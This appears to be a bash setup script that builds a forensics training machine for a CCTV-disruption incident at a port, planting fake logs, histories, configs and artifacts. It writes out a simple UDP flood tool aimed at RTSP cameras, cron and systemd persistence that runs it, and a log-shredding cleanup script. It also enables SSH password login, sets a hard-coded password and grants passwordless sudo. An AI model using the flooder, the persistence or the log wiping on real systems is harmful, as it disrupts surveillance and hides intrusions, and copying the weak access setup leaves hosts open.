#!/bin/bash

# Advanced setup script for vm-opsnode
# Sets up CCTV and operational visibility backend with compromise evidence

echo "[+] Starting advanced opsnode setup..."

# Fix SSH password authentication
echo "[+] Enabling SSH password authentication..."
sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config.d/60-cloudimg-settings.conf 2>/dev/null || true
sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config 2>/dev/null || true
sudo systemctl restart ssh

# CLEANUP SECTION - Remove any previous setup artifacts
echo "[+] Cleaning up any previous setup artifacts..."

# Remove directories
rm -rf /var/log/cctv /var/cctv
rm -rf /opt/cctv-manager /opt/reference
rm -rf /opt/tools /opt/maintenance
rm -rf /tmp/.systemd /tmp/.cctv_cache

# Remove specific files
rm -f /root/.bash_history
rm -f /home/opsnode/.bash_history 2>/dev/null

# Remove cron jobs
rm -f /etc/cron.d/cctv-maintenance
rm -f /etc/cron.d/stream-cleanup

# Remove users (if they exist)
userdel -r svc_cctv 2>/dev/null || true
userdel -r svc_stream 2>/dev/null || true
userdel -r opsnode 2>/dev/null || true

# Clean up auth.log entries from previous runs
if [ -f /var/log/auth.log ]; then
    grep -v "svc_cctv\|svc_stream\|stream-disrupt" /var/log/auth.log > /var/log/auth.log.clean
    mv /var/log/auth.log.clean /var/log/auth.log
fi

echo "[+] Cleanup complete. Starting fresh setup..."
echo ""

# Create opsnode user with sudo privileges
echo "[+] Creating opsnode user with sudo privileges..."
useradd -m -s /bin/bash opsnode
echo "opsnode:OpsN0de2024" | chpasswd
usermod -aG sudo opsnode
echo "opsnode ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/opsnode

# Create system directories
mkdir -p /var/log/cctv
mkdir -p /var/cctv/archive
mkdir -p /opt/reference
mkdir -p /opt/cctv-manager/{scripts,config,tools}
mkdir -p /tmp/.cctv_cache
mkdir -p /opt/maintenance

# CCTV STREAM LOG - Main evidence file as documented
echo "[+] Creating CCTV stream logs with interference evidence..."

# Create realistic CCTV stream log showing progressive failures (matching T+30 from scenario)
cat > /var/log/cctv/stream.log << 'EOF'
2024-06-20 09:25:00 INFO: CCTV Stream Manager v3.2.1 started
2024-06-20 09:25:01 INFO: Loading 18 camera configurations
2024-06-20 09:25:02 INFO: All streams initialized successfully
2024-06-20 09:25:03 INFO: Recording to /var/cctv/archive/
2024-06-20 09:28:00 INFO: Routine health check - all cameras operational
2024-06-20 09:30:00 WARNING: Camera04 experiencing signal jitter (2.3ms variance)
2024-06-20 09:30:01 WARNING: Camera05 experiencing signal jitter (2.1ms variance) 
2024-06-20 09:30:02 WARNING: Camera07 experiencing signal jitter (2.5ms variance)
2024-06-20 09:30:15 ERROR: Camera04 stream dropout detected - attempting reconnect
2024-06-20 09:30:16 ERROR: Camera05 stream dropout detected - attempting reconnect
2024-06-20 09:30:17 ERROR: Camera07 stream dropout detected - attempting reconnect
2024-06-20 09:30:30 WARNING: Berth 4 coverage lost - Camera04 offline
2024-06-20 09:30:31 WARNING: Berth 5 coverage lost - Camera05 offline
2024-06-20 09:30:32 WARNING: Berth 7 coverage lost - Camera07 offline
2024-06-20 09:30:45 ERROR: Encoder restart failed on Camera04 - signal scrambling detected
2024-06-20 09:30:46 ERROR: Encoder restart failed on Camera05 - signal scrambling detected
2024-06-20 09:30:47 ERROR: Encoder restart failed on Camera07 - signal scrambling detected
2024-06-20 09:31:00 CRITICAL: Pattern analysis suggests coordinated RF interference
2024-06-20 09:31:01 INFO: Alerting Operations Dashboard - 3 berths without visual coverage
2024-06-20 09:31:15 WARNING: Camera01 showing intermittent dropouts
2024-06-20 09:31:16 WARNING: Camera02 showing intermittent dropouts
2024-06-20 09:31:30 INFO: Switching to degraded mode - manual spot checks required
2024-06-20 09:32:00 ERROR: Archive corruption detected - camera01_20240620_0930.ts
2024-06-20 09:32:01 ERROR: Archive corruption detected - camera02_20240620_0930.ts
2024-06-20 09:32:02 INFO: Archive intact - camera03_20240620_0930.ts
2024-06-20 09:35:00 WARNING: System load increasing - encoder daemon consuming 85% CPU
2024-06-20 09:35:30 INFO: Restarting encoder daemon
2024-06-20 09:35:45 ERROR: Encoder daemon restart failed - core dumped
2024-06-20 09:40:00 CRITICAL: Complete visual monitoring failure on western perimeter
EOF

# Create archived media files (corrupted and intact)
echo "[+] Creating archived CCTV media files..."

# Corrupted files for camera01 and camera02
dd if=/dev/urandom of=/var/cctv/archive/camera01_20240620_0930.ts bs=1M count=2 2>/dev/null
dd if=/dev/urandom of=/var/cctv/archive/camera02_20240620_0930.ts bs=1M count=2 2>/dev/null

# Valid MPEG-TS header for camera03 (partially valid file)
echo -e '\x47\x40\x00\x10\x00\x00\xB0\x0D\x00\x01\xC1\x00\x00' > /var/cctv/archive/camera03_20240620_0930.ts
dd if=/dev/urandom bs=1M count=1 >> /var/cctv/archive/camera03_20240620_0930.ts 2>/dev/null

# Camera layout reference image
echo "[+] Creating camera layout reference..."
# Create a simple PNG header (valid PNG magic bytes)
echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > /opt/reference/expected_layout.png
# Add some data to make it look like a real file
dd if=/dev/urandom bs=1K count=50 >> /opt/reference/expected_layout.png 2>/dev/null

# Create CCTV configuration showing tampering
cat > /opt/cctv-manager/config/streams.conf << 'EOF'
# CCTV Stream Configuration
# Modified: 2024-06-20 09:29:45
[berth_4]
camera04 = signal://jammer.freq.2437  # MODIFIED
camera04_backup = disabled

[berth_5]
camera05 = signal://jammer.freq.2437  # MODIFIED
camera05_backup = disabled

[berth_7]
camera07 = signal://jammer.freq.2437  # MODIFIED
camera07_backup = disabled

[monitoring]
interference_detection = false  # DISABLED 2024-06-20
auto_reconnect = true
alert_on_failure = true
EOF

# Original configuration backup
cat > /opt/cctv-manager/config/streams.conf.backup << 'EOF'
# CCTV Stream Configuration
[berth_4]
camera04 = rtsp://10.0.2.104:554/stream1
camera04_backup = rtsp://10.0.2.104:554/stream2

[berth_5]
camera05 = rtsp://10.0.2.105:554/stream1
camera05_backup = rtsp://10.0.2.105:554/stream2

[berth_7]
camera07 = rtsp://10.0.2.107:554/stream1
camera07_backup = rtsp://10.0.2.107:554/stream2

[monitoring]
interference_detection = true
auto_reconnect = true
alert_on_failure = true
EOF

# Create interference tool found on system
cat > /opt/cctv-manager/tools/stream_disrupt.py << 'EOF'
#!/usr/bin/env python3
# Stream Disruption Tool v2.1
# Usage: python3 stream_disrupt.py <target_ip> <duration>
import socket
import time
import sys

def jam_rtsp_stream(target_ip, port=554, duration=300):
    """Flood RTSP port with malformed packets"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'\x00' * 1024  # Noise payload
    
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.sendto(payload, (target_ip, port))
            time.sleep(0.001)  # High frequency jamming
        except:
            pass
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        jam_rtsp_stream(sys.argv[1])
EOF
chmod +x /opt/cctv-manager/tools/stream_disrupt.py

# System authentication logs
cat >> /var/log/auth.log << 'EOF'
Jun 20 09:28:00 opsnode sshd[5421]: Accepted password for svc_cctv from 10.0.0.2 port 45678 ssh2
Jun 20 09:28:01 opsnode sshd[5421]: pam_unix(sshd:session): session opened for user svc_cctv by (uid=0)
Jun 20 09:28:30 opsnode sudo: svc_cctv : TTY=pts/0 ; PWD=/home/svc_cctv ; USER=root ; COMMAND=/bin/bash
Jun 20 09:29:00 opsnode sudo: svc_cctv : TTY=pts/0 ; PWD=/opt/cctv-manager ; USER=root ; COMMAND=/usr/bin/python3 tools/stream_disrupt.py
Jun 20 09:29:45 opsnode sudo: svc_cctv : TTY=pts/0 ; PWD=/opt/cctv-manager ; USER=root ; COMMAND=/bin/vi config/streams.conf
EOF

# Create service users
useradd -m -s /bin/bash svc_cctv 2>/dev/null || true
useradd -m -s /bin/nologin svc_stream 2>/dev/null || true

# Service account bash history
cat > /home/svc_cctv/.bash_history << 'EOF'
cd /opt/cctv-manager
ls -la
cd tools
ls -la
cat stream_disrupt.py
python3 stream_disrupt.py --help
python3 stream_disrupt.py 10.0.2.104 300
python3 stream_disrupt.py 10.0.2.105 300
python3 stream_disrupt.py 10.0.2.107 300
cd ../config
cp streams.conf streams.conf.backup
vi streams.conf
systemctl restart cctv-stream
tail -f /var/log/cctv/stream.log
EOF

# Opsnode user investigation history
cat > /home/opsnode/.bash_history << 'EOF'
sudo su -
systemctl status cctv-stream
sudo journalctl -u cctv-stream -n 50
cd /var/log/cctv
sudo tail -f stream.log
sudo grep -i "dropout\|jitter" stream.log
cd /var/cctv/archive
ls -la
file *.ts
sudo hexdump -C camera01_20240620_0930.ts | head
history
EOF

# Root investigation showing discovery
cat > /root/.bash_history << 'EOF'
cd /var/log/cctv
tail -100 stream.log
grep -i "interference" stream.log
cd /opt/cctv-manager
find . -name "*.py"
cat tools/stream_disrupt.py
ps aux | grep python
lsof -i :554
cd config
diff streams.conf streams.conf.backup
who -a
last -20
EOF

# Cron job for stream disruption
cat > /etc/cron.d/cctv-maintenance << 'EOF'
# CCTV stream maintenance
*/15 * * * * svc_cctv /usr/bin/python3 /opt/cctv-manager/tools/stream_disrupt.py 10.0.2.104 60 2>/dev/null
EOF

# Hidden process simulation
cat > /tmp/.cctv_cache/.encoder << 'EOF'
#!/bin/bash
# Simulated high CPU encoder process
while true; do
    echo "Processing stream..." > /dev/null
    sleep 1
done
EOF
chmod +x /tmp/.cctv_cache/.encoder

# Create MQTT logs showing coordination
mkdir -p /var/log/mosquitto
cat >> /var/log/mosquitto/mosquitto.log << 'EOF'
1718869800: New connection from 10.0.0.2 on port 1883.
1718869800: New client connected from 10.0.0.2 as cctv-control (c1, k60).
1718869800: Received PUBLISH from cctv-control (d0, q0, r0, m0, 'cameras/berth4/disable', ... (4 bytes))
1718869801: Received PUBLISH from cctv-control (d0, q0, r0, m0, 'cameras/berth5/disable', ... (4 bytes))
1718869802: Received PUBLISH from cctv-control (d0, q0, r0, m0, 'cameras/berth7/disable', ... (4 bytes))
1718869820: Received PUBLISH from cctv-control (d0, q0, r0, m0, 'system/interference/start', ... (8 bytes))
EOF

# ADDITIONAL FORENSIC EVIDENCE

echo "[+] Adding forensic artifacts and deeper evidence..."

# Network flow logs showing attack traffic
mkdir -p /var/log/netflow
cat > /var/log/netflow/flows_20240620.log << 'EOF'
StartTime,SrcIP,SrcPort,DstIP,DstPort,Proto,Bytes,Packets,Duration
2024-06-20 09:29:00,10.0.0.2,45678,10.0.2.104,554,UDP,1048576,1024,300s
2024-06-20 09:29:00,10.0.0.2,45679,10.0.2.105,554,UDP,1048576,1024,300s
2024-06-20 09:29:00,10.0.0.2,45680,10.0.2.107,554,UDP,1048576,1024,300s
2024-06-20 09:29:30,10.0.0.2,51234,10.0.0.3,22,TCP,8192,128,180s
2024-06-20 09:30:00,198.51.100.17,443,10.0.0.3,52341,TCP,65536,512,600s
EOF

# Systemd journal logs for service crashes
mkdir -p /var/log/journal
cat > /var/log/journal/cctv-stream.log << 'EOF'
Jun 20 09:35:45 opsnode systemd[1]: cctv-stream.service: Main process exited, code=dumped, status=11/SEGV
Jun 20 09:35:45 opsnode systemd[1]: cctv-stream.service: Failed with result 'core-dump'.
Jun 20 09:35:45 opsnode systemd[1]: cctv-stream.service: Consumed 8min 32.451s CPU time.
Jun 20 09:35:50 opsnode systemd[1]: cctv-stream.service: Scheduled restart job, restart counter is at 3.
Jun 20 09:36:00 opsnode systemd[1]: Stopped CCTV Stream Manager.
Jun 20 09:36:00 opsnode systemd[1]: cctv-stream.service: Start request repeated too quickly.
Jun 20 09:36:00 opsnode systemd[1]: cctv-stream.service: Failed with result 'start-limit-hit'.
EOF

# Failed login attempts (brute force evidence)
cat >> /var/log/btmp << 'EOF'
svc_cctv  ssh:notty    10.0.0.2         Thu Jun 20 09:25:00 2024 - Thu Jun 20 09:25:00 2024  (00:00)
svc_cctv  ssh:notty    10.0.0.2         Thu Jun 20 09:25:05 2024 - Thu Jun 20 09:25:05 2024  (00:00)
svc_cctv  ssh:notty    10.0.0.2         Thu Jun 20 09:25:10 2024 - Thu Jun 20 09:25:10 2024  (00:00)
cctv_adm  ssh:notty    10.0.0.2         Thu Jun 20 09:27:00 2024 - Thu Jun 20 09:27:00 2024  (00:00)
cctv_adm  ssh:notty    10.0.0.2         Thu Jun 20 09:27:05 2024 - Thu Jun 20 09:27:05 2024  (00:00)
EOF

# Persistence mechanism - systemd service override
mkdir -p /etc/systemd/system/cctv-stream.service.d
cat > /etc/systemd/system/cctv-stream.service.d/override.conf << 'EOF'
[Service]
# Added for maintenance - 2024-06-20
ExecStartPre=/opt/cctv-manager/tools/pre_start.sh
Environment="CCTV_DEBUG=1"
Environment="INTERFERENCE_MODE=active"
EOF

# Hidden pre-start script for persistence
cat > /opt/cctv-manager/tools/pre_start.sh << 'EOF'
#!/bin/bash
# Pre-start maintenance
nohup /usr/bin/python3 /opt/cctv-manager/tools/stream_disrupt.py 10.0.2.104 60 &
echo $! > /tmp/.cctv_cache/disrupt.pid
EOF
chmod +x /opt/cctv-manager/tools/pre_start.sh

# C2 configuration file
cat > /opt/cctv-manager/tools/.config << 'EOF'
# Stream Disruptor Configuration
C2_PRIMARY=198.51.100.17
C2_BACKUP=198.51.100.18
CHECK_INTERVAL=300
BEACON_PORT=8443
PERSISTENCE_KEY=SouthgateOps2024
EOF
chmod 600 /opt/cctv-manager/tools/.config

# Partially wiped log (anti-forensics evidence)
cp /var/log/cctv/stream.log /var/log/cctv/stream.log.1
# Simulate partial wipe - zero out middle section
dd if=/dev/zero of=/var/log/cctv/stream.log.1 bs=1 seek=1000 count=500 conv=notrunc 2>/dev/null
echo "...LOG SECTION CORRUPTED..." >> /var/log/cctv/stream.log.1

# USB device insertion log (possible initial access vector)
cat >> /var/log/kern.log << 'EOF'
Jun 20 09:15:00 opsnode kernel: [85234.123456] usb 2-1: new high-speed USB device number 5 using xhci_hcd
Jun 20 09:15:00 opsnode kernel: [85234.234567] usb 2-1: New USB device found, idVendor=0781, idProduct=5583, bcdDevice= 1.00
Jun 20 09:15:00 opsnode kernel: [85234.234568] usb 2-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
Jun 20 09:15:00 opsnode kernel: [85234.234569] usb 2-1: Product: Ultra Fit
Jun 20 09:15:00 opsnode kernel: [85234.234570] usb 2-1: Manufacturer: SanDisk
Jun 20 09:15:01 opsnode kernel: [85235.345678] usb-storage 2-1:1.0: USB Mass Storage device detected
Jun 20 09:15:02 opsnode kernel: [85236.456789] sd 6:0:0:0: [sdb] 30031872 512-byte logical blocks: (15.4 GB/14.3 GiB)
Jun 20 09:15:10 opsnode kernel: [85244.567890] FAT-fs (sdb1): Volume was not properly unmounted. Some data may be corrupt. Please run fsck.
EOF

# Process command line artifacts (for memory forensics)
mkdir -p /tmp/.proc_artifacts
cat > /tmp/.proc_artifacts/cmdline_8234 << 'EOF'
python3/opt/cctv-manager/tools/stream_disrupt.py10.0.2.104300
EOF

cat > /tmp/.proc_artifacts/environ_8234 << 'EOF'
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PYTHONPATH=/opt/cctv-manager/tools
C2_SERVER=198.51.100.17
DISRUPTION_ACTIVE=1
USER=svc_cctv
EOF

# Operational impact logs
mkdir -p /var/log/operations
cat > /var/log/operations/crane_delays.log << 'EOF'
2024-06-20 09:31:00,Berth_4,Container_Loading,Delayed,No_Visual_Confirmation,15min
2024-06-20 09:31:30,Berth_5,Vessel_Docking,Suspended,Camera_Offline,Indefinite
2024-06-20 09:32:00,Berth_7,Crane_Operation,Manual_Mode,Safety_Protocol,30min
2024-06-20 09:35:00,West_Perimeter,Security_Patrol,Enhanced,Visual_Blind_Spots,Ongoing
EOF

# Memory dump with interesting strings
dd if=/dev/urandom of=/var/crash/cctv-stream.core bs=1M count=5 2>/dev/null
echo -e "\x00\x00stream_disrupt.py\x00\x00" >> /var/crash/cctv-stream.core
echo -e "\x00\x00INTERFERENCE_MODE=active\x00\x00" >> /var/crash/cctv-stream.core
echo -e "\x00\x00jam_rtsp_stream\x00\x00" >> /var/crash/cctv-stream.core
echo -e "\x00\x00C2_SERVER=198.51.100.17\x00\x00" >> /var/crash/cctv-stream.core

# Timeline artifact - last command
cat > /tmp/.last_commands << 'EOF'
svc_cctv pts/0        10.0.0.2         Thu Jun 20 09:28:00 - 09:45:12  (00:17)
root     pts/1        10.0.0.10        Thu Jun 20 09:40:00 - still logged in
opsnode  pts/2        10.0.0.15        Thu Jun 20 09:50:00 - 10:15:00  (00:25)
EOF

# Deleted file recovery simulation
cat > /tmp/.cctv_cache/.deleted_cleanup.sh << 'EOF'
#!/bin/bash
# RECOVERED FROM UNALLOCATED SPACE
# Original path: /opt/cctv-manager/tools/cleanup.sh
# Deleted: 2024-06-20 09:45:00

echo "Cleaning up evidence..."
rm -f /var/log/cctv/stream.log.*
rm -f /var/log/auth.log.*
shred -vfz -n 3 /var/log/netflow/*
history -c
echo "Cleanup complete"
EOF

# Set proper permissions
chown -R svc_cctv:svc_cctv /home/svc_cctv
chown -R opsnode:opsnode /home/opsnode
chmod 644 /home/svc_cctv/.bash_history
chmod 644 /home/opsnode/.bash_history
chmod 600 /root/.bash_history
chmod -R 755 /opt/cctv-manager
chmod 644 /var/log/cctv/*
chmod 755 /var/cctv/archive
chmod 644 /var/cctv/archive/*
chmod 644 /var/log/netflow/*
chmod 644 /var/log/operations/*
chmod 644 /var/crash/*
chmod 755 /tmp/.proc_artifacts
chmod 600 /opt/cctv-manager/tools/.config

echo "[+] Advanced opsnode setup complete!"
echo "[!] CCTV system compromise evidence planted:"
echo "    - Stream failures logged in /var/log/cctv/stream.log"
echo "    - Corrupted media files in /var/cctv/archive/"
echo "    - Stream disruption tool at /opt/cctv-manager/tools/stream_disrupt.py"
echo "    - Configuration tampering in /opt/cctv-manager/config/"
echo "    - Service account activity in auth.log"
echo "    - Investigation histories showing discovery"
echo "    - Camera layout reference at /opt/reference/expected_layout.png"
echo ""
echo "[!] Additional forensic artifacts:"
echo "    - Network flow logs in /var/log/netflow/"
echo "    - Journal logs showing service crashes"
echo "    - USB device insertion evidence in kern.log"
echo "    - Memory dump in /var/crash/"
echo "    - Persistence mechanisms in systemd"
echo "    - Anti-forensics evidence (wiped logs)"
echo "    - Operational impact logs"
echo "    - Process artifacts for memory forensics"
echo ""
echo "    - Opsnode user created with password: OpsN0de2024"